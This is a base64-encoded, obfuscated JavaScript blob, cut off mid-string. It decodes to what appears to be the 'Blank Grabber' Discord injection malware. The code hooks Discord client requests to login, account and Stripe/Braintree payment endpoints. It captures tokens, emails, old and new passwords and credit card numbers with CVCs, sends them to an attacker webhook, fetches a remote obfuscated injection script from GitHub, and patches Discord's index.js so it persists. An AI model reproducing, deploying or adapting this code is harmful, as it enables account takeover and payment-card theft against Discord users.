LCdlbWJlZF9uYW1lJzpTKDB4Y2UpLCdlbWJlZF9pY29uJzpTKDB4MTI4KSwnZW1iZWRfY29sb3InOjB4NTYwZGRjLCdpbmplY3Rpb25fdXJsJzpTKDB4MTM1KSwnYXBpJzonaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lJywnbml0cm8nOnsnYm9vc3QnOnsneWVhcic6eydpZCc6JzUyMTg0NzIzNDI0NjA4MjU5OScsJ3NrdSc6UygweDhjKSwncHJpY2UnOlMoMHgxMzYpfSwnbW9udGgnOnsnaWQnOlMoMHhhNyksJ3NrdSc6JzUxMTY1MTg4MDgzNzg0MDg5NicsJ3ByaWNlJzpTKDB4ZjIpfX0sJ2NsYXNzaWMnOnsnbW9udGgnOnsnaWQnOlMoMHhkMyksJ3NrdSc6JzUxMTY1MTg3MTczNjIwMTIxNicsJ3ByaWNlJzpTKDB4MTE0KX19fSwnZmlsdGVyJzp7J3VybHMnOltTKDB4YWUpLFMoMHhjMyksUygweGU5KSxTKDB4ZmUpLFMoMHgxMTkpLFMoMHhlYyksUygweDE0MSksUygweDEwNiksUygweDg3KSwnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki9wYXltZW50X2ludGVudHMvKi9jb25maXJtJ119LCdmaWx0ZXIyJzp7J3VybHMnOltTKDB4NmMpLFMoMHhjZCksJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJyxTKDB4MTE4KSxTKDB4N2MpLFMoMHg3ZCldfX07ZnVuY3Rpb24gcGFyaXR5XzMyKFksWixvKXtyZXR1cm4gWV5aXm87fWZ1bmN0aW9uIGNoXzMyKFksWixvKXtyZXR1cm4gWVx1MDAyNlpefllcdTAwMjZvO31mdW5jdGlvbiBtYWpfMzIoWSxaLG8pe3JldHVybiBZXHUwMDI2Wl5ZXHUwMDI2b15aXHUwMDI2bzt9ZnVuY3Rpb24gcm90bF8zMihZLFope3JldHVybiBZXHUwMDNjXHUwMDNjWnxZXHUwMDNlXHUwMDNlXHUwMDNlMHgyMC1aO31mdW5jdGlvbiBzYWZlQWRkXzMyXzIoWSxaKXt2YXIgbz0oWVx1MDAyNjB4ZmZmZikrKFpcdTAwMjYweGZmZmYpLFQ9KFlcdTAwM2VcdTAwM2VcdTAwM2UweDEwKSsoWlx1MDAzZVx1MDAzZVx1MDAzZTB4MTApKyhvXHUwMDNlXHUwMDNlXHUwMDNlMHgxMCk7cmV0dXJuKFRcdTAwMjYweGZmZmYpXHUwMDNjXHUwMDNjMHgxMHxvXHUwMDI2MHhmZmZmO31mdW5jdGlvbiBzYWZlQWRkXzMyXzUoWSxaLG8sVCxIKXt2YXIgVj0oWVx1MDAyNjB4ZmZmZikrKFpcdTAwMjYweGZmZmYpKyhvXHUwMDI2MHhmZmZmKSsoVFx1MDAyNjB4ZmZmZikrKEhcdTAwMjYweGZmZmYpLGk9KFlcdTAwM2VcdTAwM2VcdTAwM2UweDEwKSsoWlx1MDAzZVx1MDAzZVx1MDAzZTB4MTApKyhvXHUwMDNlXHUwMDNlXHUwMDNlMHgxMCkrKFRcdTAwM2VcdTAwM2VcdTAwM2UweDEwKSsoSFx1MDAzZVx1MDAzZVx1MDAzZTB4MTApKyhWXHUwMDNlXHUwMDNlXHUwMDNlMHgxMCk7cmV0dXJuKGlcdTAwMjYweGZmZmYpXHUwMDNjXHUwMDNjMHgxMHxWXHUwMDI2MHhmZmZmO31mdW5jdGlvbiBiaW5iMmhleChZKXtjb25zdCBtPVM7dmFyIFo9bSgweDc0KSxvPScnLFQ9WVsnbGVuZ3RoJ10qMHg0LEgsVjtmb3IoSD0weDA7SFx1MDAzY1Q7SCs9MHgxKXtWPVlbSFx1MDAzZVx1MDAzZVx1MDAzZTB4Ml1cdTAwM2VcdTAwM2VcdTAwM2UoMHgzLUglMHg0KSoweDgsbys9WlsnY2hhckF0J10oVlx1MDAzZVx1MDAzZVx1MDAzZTB4NFx1MDAyNjB4ZikrWlsnY2hhckF0J10oVlx1MDAyNjB4Zik7fXJldHVybiBvO31mdW5jdGlvbiBnZXRIKCl7cmV0dXJuWzB4Njc0NTIzMDEsMHhlZmNkYWI4OSwweDk4YmFkY2ZlLDB4MTAzMjU0NzYsMHhjM2QyZTFmMF07fWZ1bmN0aW9uIHJvdW5kU0hBMShZLFope3ZhciBvPVtdLFYsaSxSLEEscixsLE49Y2hfMzIsaz1wYXJpdHlfMzIsRj1tYWpfMzIsWD1yb3RsXzMyLHU9c2FmZUFkZF8zMl8yLEosdz1zYWZlQWRkXzMyXzU7Vj1aWzB4MF0saT1aWzB4MV0sUj1aWzB4Ml0sQT1aWzB4M10scj1aWzB4NF07Zm9yKEo9MHgwO0pcdTAwM2MweDUwO0orPTB4MSl7Slx1MDAzYzB4MTA/b1tKXT1ZW0pdOm9bSl09WChvW0otMHgzXV5vW0otMHg4XV5vW0otMHhlXV5vW0otMHgxMF0sMHgxKTtpZihKXHUwMDNjMHgxNClsPXcoWChWLDB4NSksTihpLFIsQSksciwweDVhODI3OTk5LG9bSl0pO2Vsc2V7aWYoSlx1MDAzYzB4MjgpbD13KFgoViwweDUpLGsoaSxSLEEpLHIsMHg2ZWQ5ZWJhMSxvW0pdKTtlbHNlIEpcdTAwM2MweDNjP2w9dyhYKFYsMHg1KSxGKGksUixBKSxyLDB4OGYxYmJjZGMsb1tKXSk6bD13KFgoViwweDUpLGsoaSxSLEEpLHIsMHhjYTYyYzFkNixvW0pdKTt9cj1BLEE9UixSPVgoaSwweDFlKSxpPVYsVj1sO31yZXR1cm4gWlsweDBdPXUoVixaWzB4MF0pLFpbMHgxXT11KGksWlsweDFdKSxaWzB4Ml09dShSLFpbMHgyXSksWlsweDNdPXUoQSxaWzB4M10pLFpbMHg0XT11KHIsWlsweDRdKSxaO31mdW5jdGlvbiBmaW5hbGl6ZVNIQTEoWSxaLG8sVCl7Y29uc3QgaD1TO3ZhciBWLFIsQTtBPShaKzB4NDFcdTAwM2VcdTAwM2VcdTAwM2UweDlcdTAwM2NcdTAwM2MweDQpKzB4Zjt3aGlsZShZWydsZW5ndGgnXVx1MDAzYz1BKXtZWydwdXNoJ10oMHgwKTt9WVtaXHUwMDNlXHUwMDNlXHUwMDNlMHg1XXw9MHg4MFx1MDAzY1x1MDAzYzB4MTgtWiUweDIwLFlbQV09WitvLFI9WVsnbGVuZ3RoJ107Zm9yKFY9MHgwO1ZcdTAwM2NSO1YrPTB4MTApe1Q9cm91bmRTSEExKFlbaCgweDE0NCldKFYsVisweDEwKSxUKTt9cmV0dXJuIFQ7fWZ1bmN0aW9uIGhleDJiaW5iKFksWixvKXtjb25zdCB5PVM7dmFyIFQsSD1ZW3koMHhhNildLFYsUixBLHIsYztUPVp8fFsweDBdLG89b3x8MHgwLGM9b1x1MDAzZVx1MDAzZVx1MDAzZTB4MzsweDAhPT1IJTB4Mlx1MDAyNlx1MDAyNmNvbnNvbGVbJ2Vycm9yJ10oeSgweGZiKSk7Zm9yKFY9MHgwO1ZcdTAwM2NIO1YrPTB4Mil7Uj1wYXJzZUludChZW3koMHgxMWIpXShWLDB4MiksMHgxMCk7aWYoIWlzTmFOKFIpKXtyPShWXHUwMDNlXHUwMDNlXHUwMDNlMHgxKStjLEE9clx1MDAzZVx1MDAzZVx1MDAzZTB4Mjt3aGlsZShUW3koMHhhNildXHUwMDNjPUEpe1RbeSgweDg0KV0oMHgwKTt9VFtBXXw9Ulx1MDAzY1x1MDAzYzB4OCooMHgzLXIlMHg0KTt9ZWxzZSBjb25zb2xlW3koMHg3ZildKHkoMHhkOCkpO31yZXR1cm57J3ZhbHVlJzpULCdiaW5MZW4nOkgqMHg0K299O31jbGFzcyBqc1NIQXtjb25zdHJ1Y3Rvcigpe2NvbnN0IFA9Uzt2YXIgWT0weDAsWj1bXSxvPTB4MCxULEgsVixpLFIsQSxyPSFbXSxjPSFbXSxsPVtdLE49W10sayxrPTB4MTtIPWhleDJiaW5iLChrIT09cGFyc2VJbnQoaywweGEpfHwweDFcdTAwM2VrKVx1MDAyNlx1MDAyNmNvbnNvbGVbUCgweDdmKV0oUCgweDEyNikpLGk9MHgyMDAsUj1yb3VuZFNIQTEsQT1maW5hbGl6ZVNIQTEsVj0weGEwLFQ9Z2V0SCgpLHRoaXNbUCgweGMxKV09ZnVuY3Rpb24oRil7Y29uc3QgVz1QO3ZhciBYLHUsSix3LG4sYSxFO1g9aGV4MmJpbmIsdT1YKEYpLEo9dVsnYmluTGVuJ10sdz11W1coMHg2ZCldLG49aVx1MDAzZVx1MDAzZVx1MDAzZTB4MyxFPW4vMHg0LTB4MTtpZihuXHUwMDNjSi8weDgpe3c9QSh3LEosMHgwLGdldEgoKSk7d2hpbGUod1tXKDB4YTYpXVx1MDAzYz1FKXt3W1coMHg4NCldKDB4MCk7fXdbRV1cdTAwMjY9MHhmZmZmZmYwMDt9ZWxzZXtpZihuXHUwMDNlSi8weDgpe3doaWxlKHdbJ2xlbmd0aCddXHUwMDNjPUUpe3dbVygweDg0KV0oMHgwKTt9d1tFXVx1MDAyNj0weGZmZmZmZjAwO319Zm9yKGE9MHgwO2FcdTAwM2M9RTthKz0weDEpe2xbYV09d1thXV4weDM2MzYzNjM2LE5bYV09d1thXV4weDVjNWM1YzVjO31UPVIobCxUKSxZPWksYz0hIVtdO30sdGhpc1tQKDB4MTEwKV09ZnVuY3Rpb24oRil7Y29uc3QgQj1QO3ZhciBYLHUsSix3LG4sYT0weDAsRT1pXHUwMDNlXHUwMDNlXHUwMDNlMHg1O1g9SChGLFosbyksdT1YW0IoMHgxMmIpXSx3PVhbQigweDZkKV0sSj11XHUwMDNlXHUwMDNlXHUwMDNlMHg1O2ZvcihuPTB4MDtuXHUwMDNjSjtuKz1FKXthK2lcdTAwM2M9dVx1MDAyNlx1MDAyNihUPVIod1tCKDB4MTQ0KV0obixuK0UpLFQpLGErPWkpO31ZKz1hLFo9d1snc2xpY2UnXShhXHUwMDNlXHUwMDNlXHUwMDNlMHg1KSxvPXUlaTt9LHRoaXNbUCgweDExZildPWZ1bmN0aW9uKCl7Y29uc3Qgej1QO3ZhciBGOyFbXT09PWNcdTAwMjZcdTAwMjZjb25zb2xlW3ooMHg3ZildKHooMHhhNCkpO2NvbnN0IFg9ZnVuY3Rpb24odSl7cmV0dXJuIGJpbmIyaGV4KHUpO307cmV0dXJuIVtdPT09clx1MDAyNlx1MDAyNihGPUEoWixvLFksVCksVD1SKE4sZ2V0SCgpKSxUPUEoRixWLGksVCkpLHI9ISFbXSxYKFQpO307fX1pZihTKDB4MTBiKT09PXR5cGVvZiBkZWZpbmVcdTAwMjZcdTAwMjZkZWZpbmVbUygweGIwKV0pZGVmaW5lKGZ1bmN0aW9uKCl7cmV0dXJuIGpzU0hBO30pO2Vsc2UgUygweDlkKSE9PXR5cGVvZiBleHBvcnRzP1MoMHg5ZCkhPT10eXBlb2YgbW9kdWxlXHUwMDI2XHUwMDI2bW9kdWxlW1MoMHgxMmQpXT9tb2R1bGVbUygweDEyZCldPWV4cG9ydHM9anNTSEE6ZXhwb3J0cz1qc1NIQTpnbG9iYWxbUygweDEyNyldPWpzU0hBO2pzU0hBW1MoMHgxMWEpXVx1MDAyNlx1MDAyNihqc1NIQT1qc1NIQVtTKDB4MTFhKV0pO2Z1bmN0aW9uIHRvdHAoWSl7Y29uc3QgZz1TLFo9MHgxZSxvPTB4NixUPURhdGVbZygweDcyKV0oKSxIPU1hdGhbZygweDgxKV0oVC8weDNlOCksVj1sZWZ0cGFkKGRlYzJoZXgoTWF0aFtnKDB4ZmYpXShIL1opKSwweDEwLCcwJyksaT1uZXcganNTSEEoKTtpW2coMHhjMSldKGJhc2UzMnRvaGV4KFkpKSxpWyd1cGRhdGUnXShWKTtjb25zdCBSPWlbZygweDExZildKCksQT1oZXgyZGVjKFJbJ3N1YnN0cmluZyddKFJbZygweGE2KV0tMHgxKSk7bGV0IHI9KGhleDJkZWMoUltnKDB4MTFiKV0oQSoweDIsMHg4KSlcdTAwMjZoZXgyZGVjKCc3ZmZmZmZmZicpKSsnJztyZXR1cm4gcj1yWydzdWJzdHInXShNYXRoW2coMHhjOCldKHJbJ2xlbmd0aCddLW8sMHgwKSxvKSxyO31mdW5jdGlvbiBoZXgyZGVjKFkpe3JldHVybiBwYXJzZUludChZLDB4MTApO31mdW5jdGlvbiB4KCl7Y29uc3QgeDk9Wyd2YXJcXHgyMHhtbEh0dHBcXHgyMD1cXHgyMG5ld1xceDIwWE1MSHR0cFJlcXVlc3QoKTtcXHgyMFxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB4bWxIdHRwLm9wZW4oXFx4MjJHRVRcXHgyMixcXHgyMFxceDIyJywnZXJyb3InLCdob3N0Jywncm91bmQnLCdkYXRhJywnY2FyZFtleHBfeWVhcl0nLCdwdXNoJywnZ2V0QWxsV2luZG93cycsJ2Rpc2NvcmQnLCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YqL3NldHVwX2ludGVudHMvKi9jb25maXJtJywnMTQyMDk2Qk9haHRJJywnKipcXHgwYUNyZWRpdFxceDIwQ2FyZFxceDIwRXhwaXJhdGlvbjpcXHgyMCoqJywnKipEaXNjb3JkXFx4MjBJbmZvKionLCdta2RpclN5bmMnLCc1MTE2NTE4ODU0NTk5NjM5MDQnLCdybWRpclN5bmMnLCdwYXNzd29yZCcsJ2xlbmdodCcsJzQ3MzExMXVXdW9scScsJyoqXFx4MGFOZXdcXHgyMFBhc3N3b3JkOlxceDIwKionLCdodHRwczovL2Rpc2NvcmQuZ2lmdC8nLCdcdTAwM2M6cGF5cGFsOjk1MTEzOTE4OTM4OTQxMDM2NVx1MDAzZScsJ3VwbG9hZERhdGEnLCdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjIzNDU2NycsJ2ludmFsaWQnLCdyZXBsYWNlJywnRGlzY29yZFxceDIwU3RhZmYnLCcqXFx4MGFCYWRnZXM6XFx4MjAqKicsJ2RhcndpbicsJ3NlcCcsJ1xceDIyKTtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFxceDI3Q29udGVudC1UeXBlXFx4MjcsXFx4MjBcXHgyN2FwcGxpY2F0aW9uL2pzb25cXHgyNyk7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMHhtbEh0dHAuc2VuZChKU09OLnN0cmluZ2lmeSgnLCd1bmRlZmluZWQnLCcqKlBhc3N3b3JkXFx4MjBDaGFuZ2VkKionLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJyoqTml0cm9cXHgyMENvZGU6KipcXHgwYWBgYGRpZmZcXHgwYStcXHgyMCcsJ2VtYWlsJywnZW5kc1dpdGgnLCcqKlxceDBhQmlsbGluZzpcXHgyMCoqJywnQ2Fubm90XFx4MjBjYWxsXFx4MjBnZXRITUFDXFx4MjB3aXRob3V0XFx4MjBmaXJzdFxceDIwc2V0dGluZ1xceDIwSE1BQ1xceDIwa2V5JywncGFja2FnZS5qc29uJywnbGVuZ3RoJywnNTIxODQ3MjM0MjQ2MDgyNTk5Jywnb25Db21wbGV0ZWQnLCdJbnZhbGlkXFx4MjBiYXNlMzJcXHgyMGNoYXJhY3RlclxceDIwaW5cXHgyMGtleScsJ3ByaWNlJywnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luXFx4MjBcXHgyNypcXHgyNycsJ3JldmVyc2UnLCdmbGFncycsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL3VzZXJzL0BtZScsJ2NvbnN0XFx4MjBmc1xceDIwPVxceDIwcmVxdWlyZShcXHgyN2ZzXFx4MjcpLFxceDIwaHR0cHNcXHgyMD1cXHgyMHJlcXVpcmUoXFx4MjdodHRwc1xceDI3KTtcXHgwYWNvbnN0XFx4MjBpbmRleEpzXFx4MjA9XFx4MjBcXHgyNycsJ2FtZCcsJ2luZGV4LmpzJywnbWV0aG9kJywnY29udGVudCcsJ2NvbnRlbnQtc2VjdXJpdHktcG9saWN5JywnXFx4MjcpXFx4MGFpZlxceDIwKGZzLmV4aXN0c1N5bmMoYmRQYXRoKSlcXHgyMHJlcXVpcmUoYmRQYXRoKTsnLCcqKlBheVBhbFxceDIwQWRkZWQqKicsJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJywnZW1iZWRfbmFtZScsJyoqVG9rZW4qKicsJ2VtYmVkX2ljb24nLCdyZXF1ZXN0JywncGF0aCcsJ3NwbGl0JywnMjQ4MTc1Y2RFa2NwJywnUE9TVCcsJ0Rpc2NvcmRcXHgyMEJ1Z1xceDIwSHVudGVyXFx4MjAoTm9ybWFsKScsJ3NldEhNQUNLZXknLCdcXHgyNztcXHgwYWNvbnN0XFx4MjBiZFBhdGhcXHgyMD1cXHgyMFxceDI3JywnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovdXNlcnMvQG1lJywnQXV0aG9yaXphdGlvbicsJyoqTml0cm9cXHgyMGJvdWdodCEqKicsJ3BsYXRmb3JtJywnXFx4Mjc7XFx4MGFjb25zdFxceDIwZmlsZVNpemVcXHgyMD1cXHgyMGZzLnN0YXRTeW5jKGluZGV4SnMpLnNpemVcXHgwYWZzLnJlYWRGaWxlU3luYyhpbmRleEpzLFxceDIwXFx4Mjd1dGY4XFx4MjcsXFx4MjAoZXJyLFxceDIwZGF0YSlcXHgyMD1cdTAwM2VcXHgyMHtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIwaWZcXHgyMChmaWxlU2l6ZVxceDIwXHUwMDNjXFx4MjAyMDAwMFxceDIwfHxcXHgyMGRhdGFcXHgyMD09PVxceDIwXFx4MjJtb2R1bGUuZXhwb3J0c1xceDIwPVxceDIwcmVxdWlyZShcXHgyNy4vY29yZS5hc2FyXFx4MjcpXFx4MjIpXFx4MjBcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBpbml0KCk7XFx4MGF9KVxceDBhYXN5bmNcXHgyMGZ1bmN0aW9uXFx4MjBpbml0KClcXHgyMHtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIwaHR0cHMuZ2V0KFxceDI3JywnbWF4Jywnd3NzOi8vcmVtb3RlLWF1dGgtZ2F0ZXdheScsJ05pdHJvXFx4MjBUeXBlOlxceDIwKionLCcqKkNyZWRpdFxceDIwQ2FyZFxceDIwQWRkZWQqKicsJ3R5cGUnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJywnQmxhbmtcXHgyMEdyYWJiZXJcXHgyMEluamVjdGlvbicsJ1xceDI3KVxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMHJlcy5waXBlKGZpbGUpO1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMGZpbGUub24oXFx4MjdmaW5pc2hcXHgyNyxcXHgyMCgpXFx4MjA9XHUwMDNlXFx4MjB7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBmaWxlLmNsb3NlKCk7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwfSk7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMFxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB9KS5vbihcXHgyMmVycm9yXFx4MjIsXFx4MjAoZXJyKVxceDIwPVx1MDAzZVxceDIwe1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMHNldFRpbWVvdXQoaW5pdCgpLFxceDIwMTAwMDApO1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB9KTtcXHgwYX1cXHgwYXJlcXVpcmUoXFx4MjcnLCdtb250aCcsJ2h0dHBzJywnJVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCUnLCc1MjE4NDY5MTg2Mzc0MjA1NDUnLCdlbnYnLCdIeXBlU3F1YWRcXHgyMEJyYXZlcnknLCd0b2tlbnMnLCcyNjcxNjgwT29HUE9UJywnU3RyaW5nXFx4MjBvZlxceDIwSEVYXFx4MjB0eXBlXFx4MjBjb250YWluc1xceDIwaW52YWxpZFxceDIwY2hhcmFjdGVycycsJ1xceDIyKTtcXHgyMFxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB4bWxIdHRwLnNlbmQobnVsbCk7XFx4MjBcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIweG1sSHR0cC5yZXNwb25zZVRleHQnLCdwYXRobmFtZScsJ3llYXInLCdwaW5nX29uX3J1bicsJ3VzZCcsJ1xceDI3KVxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMFxceDIwXFx4MjBcXHgyMHJlcy5yZXBsYWNlKFxceDI3JVdFQkhPT0tfS0VZJVxceDI3LFxceDIwXFx4MjcnLCclV0VCSE9PS19LRVklJywndG9TdHJpbmcnLCdsb2cnLCdmaWx0ZXInLCdDcmVkaXRcXHgyMENhcmRcXHgyME51bWJlcjpcXHgyMCoqJywnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVyc1xceDIwXFx4MjcqXFx4MjcnLCcqKlxceDIwLVxceDIwUGFzc3dvcmQ6XFx4MjAqKicsJyoqXFx4MGFQYXNzd29yZDpcXHgyMCoqJywnRW1haWw6XFx4MjAqKicsJ2FwcGxpY2F0aW9uL2pzb24nLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL3VzZXJzL0BtZScsJ3Jlc291cmNlcycsJ3dlYkNvbnRlbnRzJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hdXRoL2xvZ2luJywnY2FyZFtleHBfbW9udGhdJywnZXhpc3RzU3luYycsJ2FyZ3YnLCcyMDBuRVZBUlUnLCdwYXlwYWxfYWNjb3VudHMnLCc5OTknLCduaXRybycsJ2RlZmF1bHRTZXNzaW9uJywnUGFydG5lcmVkXFx4MjBTZXJ2ZXJcXHgyME93bmVyJywnSHlwZVNxdWFkXFx4MjBCcmlsbGlhbmNlJywnd2luMzInLCdib29zdCcsJzEyNjM0NTVmVnB3SUgnLCdIeXBlU3F1YWRcXHgyMEJhbGFuY2UnLCdTdHJpbmdcXHgyMG9mXFx4MjBIRVhcXHgyMHR5cGVcXHgyMG11c3RcXHgyMGJlXFx4MjBpblxceDIwYnl0ZVxceDIwaW5jcmVtZW50cycsJ3VubGlua1N5bmMnLCdOaXRybycsJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdmbG9vcicsJ2ZpbHRlcjInLCdjYXRjaCcsJ0FjdGl2ZVxceDIwRGV2ZWxvcGVyJywnTml0cm9cXHgyMEJhc2ljJywnXFx4NWNiZXR0ZXJkaXNjb3JkXFx4NWNkYXRhXFx4NWNiZXR0ZXJkaXNjb3JkLmFzYXInLCdOaXRyb1xceDIwQ2xhc3NpYycsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovdG9rZW5zJywnLi9jb3JlLmFzYXInLCdnaWZ0X2NvZGUnLCdFYXJseVxceDIwVmVyaWZpZWRcXHgyMEJvdFxceDIwRGV2ZWxvcGVyJywnYXV0b19idXlfbml0cm8nLCdmdW5jdGlvbicsJ2NvbmNhdCcsJ05ld1xceDIwRW1haWw6XFx4MjAqKicsJ05vXFx4MjBOaXRybycsJ3N0YXR1c0NvZGUnLCd1cGRhdGUnLCcqKlxceDBhQmFkZ2VzOlxceDIwKionLCdDb250ZW50cycsJ2F2YXRhcicsJzQ5OScsJ0BldmVyeW9uZScsJ3N0YXJ0c1dpdGgnLCd3cml0ZUZpbGVTeW5jJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdkZWZhdWx0Jywnc3Vic3RyJywnd2luZG93LndlYnBhY2tKc29ucD8oZ2c9d2luZG93LndlYnBhY2tKc29ucC5wdXNoKFtbXSx7Z2V0X3JlcXVpcmU6KGEsYixjKT1cdTAwM2VhLmV4cG9ydHM9Y30sW1tcXHgyMmdldF9yZXF1aXJlXFx4MjJdXV0pLGRlbGV0ZVxceDIwZ2cubS5nZXRfcmVxdWlyZSxkZWxldGVcXHgyMGdnLmMuZ2V0X3JlcXVpcmUpOndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcFx1MDAyNlx1MDAyNndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcC5wdXNoKFtbTWF0aC5yYW5kb20oKV0se30sYT1cdTAwM2V7Z2c9YX1dKTtmdW5jdGlvblxceDIwTG9nT3V0KCl7KGZ1bmN0aW9uKGEpe2NvbnN0XFx4MjBiPVxceDIyc3RyaW5nXFx4MjI9PXR5cGVvZlxceDIwYT9hOm51bGw7Zm9yKGNvbnN0XFx4MjBjXFx4MjBpblxceDIwZ2cuYylpZihnZy5jLmhhc093blByb3BlcnR5KGMpKXtjb25zdFxceDIwZD1nZy5jW2NdLmV4cG9ydHM7aWYoZFx1MDAyNlx1MDAyNmQuX19lc01vZHVsZVx1MDAyNlx1MDAyNmQuZGVmYXVsdFx1MDAyNlx1MDAyNihiP2QuZGVmYXVsdFtiXTphKGQuZGVmYXVsdCkpKXJldHVyblxceDIwZC5kZWZhdWx0O2lmKGRcdTAwMjZcdTAwMjYoYj9kW2JdOmEoZCkpKXJldHVyblxceDIwZH1yZXR1cm5cXHgyMG51bGx9KShcXHgyMmxvZ2luXFx4MjIpLmxvZ291dCgpfUxvZ091dCgpOycsJ2NoYXJBdCcsJ2luaXRpYXRpb24nLCdnZXRITUFDJywnaW5qZWN0aW9uX3VybCcsJ2RlZmF1bHQtc3JjXFx4MjBcXHgyNypcXHgyNycsJyoqXFx4MGFPbGRcXHgyMFBhc3N3b3JkOlxceDIwKionLCdEaXNjb3JkXFx4MjBCdWdcXHgyMEh1bnRlclxceDIwKEdvbGRlbiknLCdBUFBEQVRBJywnZGlzY29yZC5jb20nLCdudW1Sb3VuZHNcXHgyMG11c3RcXHgyMGFcXHgyMGludGVnZXJcXHgyMFx1MDAzZT1cXHgyMDEnLCdqc1NIQScsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mNGtlZHJlNGxpdHkvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycsJzNWZlhOYVonLCdmcm9tJywnYmluTGVuJywnLndlYnAnLCdleHBvcnRzJywnMTc2MTE3NnVLQ1hxZycsJ3ByZW1pdW1fdHlwZScsJ1xceDIyKTtcXHgwYVxceDIwXFx4MjBcXHgyMFxceDIweG1sSHR0cC5zZW5kKG51bGwpO1xceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB4bWxIdHRwLnJlc3BvbnNlVGV4dDsnLCdkaXNjcmltaW5hdG9yJywnXFx4MjB8XFx4MjAnLCd0b1VwcGVyQ2FzZScsJ05vbmUnLCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZjRrZWRyZTRsaXR5L0Rpc2NvcmQtSW5qZWN0aW9uLUJHL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCc5OTk5Jywnb25CZWZvcmVSZXF1ZXN0Jywnd2ViaG9va19wcm90ZWN0b3Jfa2V5JywnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywnOTFCZ25NeVonLCduZXdfcGFzc3dvcmQnLCcvYmlsbGluZy9wYXltZW50LXNvdXJjZXNcXHgyMixcXHgyMGZhbHNlKTtcXHgyMFxceDBhXFx4MjBcXHgyMFxceDIwXFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXFx4MjJBdXRob3JpemF0aW9uXFx4MjIsXFx4MjBcXHgyMicsJyoqXFx4MGFDVkM6XFx4MjAqKicsJyh3ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcC5wdXNoKFtbXFx4MjdcXHgyN10se30sZT1cdTAwM2V7bT1bXTtmb3IobGV0XFx4MjBjXFx4MjBpblxceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT1cdTAwM2VtPy5leHBvcnRzPy5kZWZhdWx0Py5nZXRUb2tlbiE9PXZvaWRcXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJywnZW1iZWRfY29sb3InLCd1c2VybmFtZScsJ2h0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tL21lcmNoYW50cy80OXBwMnJwNHBoeW03Mzg3L2NsaWVudF9hcGkvdiovcGF5bWVudF9tZXRob2RzL3BheXBhbF9hY2NvdW50cycsJ2FwcCcsJ0Vhcmx5XFx4MjBTdXBwb3J0ZXInLCdzbGljZScsJ2FwcC5hc2FyJywnKSk7XFx4MGFcXHgyMFxceDIwXFx4MjBcXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0Jywnc3RyaW5naWZ5JywncGluZ192YWwnLCdjYXJkW2N2Y10nLCc3NjY3NTRZRld5bWwnLCdIeXBlU3F1YWRcXHgyMEV2ZW50JywnZWxlY3Ryb24nLCdqb2luJywnaHR0cHM6Ly9zdGF0dXMuZGlzY2